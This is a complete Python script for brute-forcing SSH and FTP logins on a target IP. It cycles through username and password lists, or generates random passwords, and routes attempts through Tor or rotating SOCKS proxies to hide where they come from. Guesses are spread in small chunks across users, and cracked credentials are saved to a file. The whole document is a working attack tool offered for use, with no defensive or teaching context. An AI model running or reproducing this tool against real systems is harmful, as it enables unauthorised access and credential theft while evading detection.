#!/usr/bin/env python3

import argparse
import time
import paramiko
from ftplib import FTP, error_perm
from colorama import Fore, init
import requests
import socks
import socket
import random
import string
import os
import tempfile

init(autoreset=True)


def current_timestamp():
    return f"{Fore.WHITE}[{Fore.YELLOW}{time.strftime('%H:%M:%S', time.localtime())}{Fore.WHITE}]{Fore.RESET}"

def generate_random_password_list(num_passwords=100000):
    characters = string.ascii_letters + string.digits + string.punctuation
    passwords = set()

    while len(passwords) < num_passwords:
        password = ''.join(random.choice(characters) for i in range(random.randint(8, 16)))
        passwords.add(password)


    with tempfile.NamedTemporaryFile(delete=False, mode='w') as tmp:
        for password in passwords:
            tmp.write(password + "\n")
        return tmp.name

def set_up_tor():
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} INITIALIZING TOR PROXY...")

    attempt_count = 0
    max_attempts = 3
    success = False

    while attempt_count < max_attempts:
        try:
            old_ip = get_public_ip()
            socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
            socket.socket = socks.socksocket
            new_ip = get_public_ip()
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Old IP: {Fore.LIGHTBLUE_EX}{old_ip}")
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} New IP (via Tor): {Fore.LIGHTBLUE_EX}{new_ip}")
            success = True
            break
        except socket.error:
            attempt_count += 1
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Socket error occurred during Tor setup. Attempt {attempt_count}/{max_attempts}.")

    if not success:
        print(
            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Tor initialization failed after 3 attempts, proceeding without Tor.")

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except requests.RequestException:
        return "Unknown IP"


def load_usernames_from_file(filename):
    try:
        with open(filename, encoding='latin-1') as file:
            return file.read().splitlines()
    except EOFError:
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED}  EOFError encountered when reading usernames from file.")
        return []

def parse_arguments():
    parser = argparse.ArgumentParser(description='Brute force against SSH and FTP services.')
    parser.add_argument('--service', required=True, choices=['ftp', 'ssh'],
                        help="Service to attack. Choose 'ftp' or 'ssh'.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-w', '--wordlist', help="Password Wordlist.")
    group.add_argument('-r', '--rand', action='store_true', help="Use a random password between 8 and 16 characters.")
    parser.add_argument('-u', '--users', required=True, help="File containing a list of usernames.")
    parser.add_argument('--ip', required=True, type=str, help="IP address of the target.")
    parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
    parser.add_argument('--proxies', type=str, help="File containing a list of proxies.")
    args = parser.parse_args()

    if args.wordlist and args.rand:
        parser.error("You can't use both -w and -r at the same time. Choose one.")
    elif not args.wordlist and not args.rand:
        parser.error("You must provide one of -w or -r.")

    return args


def save_to_file(ip, service, user, password):
    with open('Credentials', 'a') as file:
        file.write(f"IP: {ip}, Service: {service}, User: {user}, Password: {password}\n")



def cycle_through_proxies(proxies):
    i = 0
    while True:
        yield proxies[i]
        i = (i + 1) % len(proxies)


def ssh_attack(ip, user, password, proxy_ip=None, proxy_port=None):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if proxy_ip and proxy_port:
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
    try:
        client.connect(ip, username=user, password=password, timeout=5)
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
        return True
    except paramiko.AuthenticationException:
        return False
    except (socket.timeout, paramiko.SSHException):
        if proxy_ip and proxy_port:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} SSH Connection failed.")

        return None
    except socket.error as e:
        if 'Connection reset by peer' in str(e):
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Connection reset by peer.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error with SSH (socket.error): {e}")
        return None
    except paramiko.ssh_exception.SSHException as e:
        if 'Error reading SSH protocol banner' in str(e):
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error reading SSH protocol banner.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Error with SSH: {e}")
        return False
    finally:
        client.close()


def ftp_attack(ip, user, password, proxy_ip=None, proxy_port=None):
    if proxy_ip and proxy_port:
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
        socket.socket = socks.socksocket
    try:
        with FTP(ip, timeout=5) as ftp:
            ftp.login(user, password)
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
            return True
    except error_perm as e:
        if str(e).startswith('530 '):
            return False
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} FTP error: {e}")
            return False
    except socket.error:
        if proxy_ip and proxy_port:
            print(
                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Proxy {proxy_ip}:{proxy_port} failed.")
        else:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} FTP Connection failed.")

        return None


def handle_timeout(func, *args, **kwargs):
    retries = 2
    for _ in range(retries):
        try:
            return func(*args, **kwargs)
        except (socket.timeout, requests.ConnectionError):
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Connection timed out. Waiting for 15 seconds before retrying...")
            time.sleep(15)
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Too many timeouts. Exiting the script.")
    exit(1)


def load_proxies_from_file(filename):
    try:
        with open(filename, 'r') as file:
            return [line.strip().split(":") for line in file.readlines()]
    except EOFError:
        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} {Fore.RED}  EOFError encountered when reading proxies from file.")
        return []

if __name__ == '__main__':
    try:
        print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} STARTING ATTACK...")
        start_time = time.time()
        attempt_count = 0

        time.sleep(0.5)
        args = parse_arguments()

        if args.rand:
            args.wordlist = generate_random_password_list()

        if args.tor and args.proxies:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} You cannot use both Tor and a proxy file at the same time!")
            exit(1)

        if args.tor:
            handle_timeout(set_up_tor)

        proxies = []
        if args.proxies:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Loading proxies from file ....")
            proxies = load_proxies_from_file(args.proxies)

        passwords = [line.strip() for line in open(args.wordlist, 'r', encoding='latin-1').readlines()]
        users = [line.strip() for line in open(args.users, 'r', encoding='latin-1').readlines()]

        password_chunk_size = 3
        first_iteration = True
        proxy_gen = None
        if proxies:
            proxy_gen = cycle_through_proxies(proxies)

        for i in range(0, len(passwords), password_chunk_size):
            for idx, user in enumerate(users):
                proxy_ip, proxy_port = next(proxy_gen) if proxy_gen else (None, None)

                if proxy_ip:
                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using proxy {proxy_ip}:{proxy_port}")

                if idx == 0:
                    if not first_iteration:
                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Returning to first user...")
                else:
                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Switching to next user....")

                for j in range(password_chunk_size):
                    if i + j >= len(passwords):
                        break
                    password = passwords[i + j]
                    print(current_timestamp(), f"Trying user [*]{Fore.YELLOW}{user}{Fore.RESET}[*] with password: {Fore.YELLOW}{password}")
                    attempt_count += 1
                    time_elapsed = time.time() - start_time
                    if args.service == 'ssh':
                        if handle_timeout(ssh_attack, args.ip, user, password, proxy_ip, proxy_port):
                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for {Fore.RESET}[*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN} {password} {Fore.RESET}in {time_elapsed:.2f} seconds with {attempt_count} tries.")

                            users.remove(user)
                            break
                    elif args.service == 'ftp':
                        if handle_timeout(ftp_attack, args.ip, user, password, proxy_ip, proxy_port):
                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for {Fore.RESET}[*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN} {password} {Fore.RESET}in {time_elapsed:.2f} seconds with {attempt_count} tries.")

                            users.remove(user)
                            break

            first_iteration = False

        print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.BLUE} Brute force completed.")

        if args.rand:
            os.remove(args.wordlist)

    except KeyboardInterrupt:
        print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} ATTACK STOPPED")
        exit(0)
    except EOFError:
        print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unexpected End of File (EOF) encountered. Exiting.")
        exit(1)

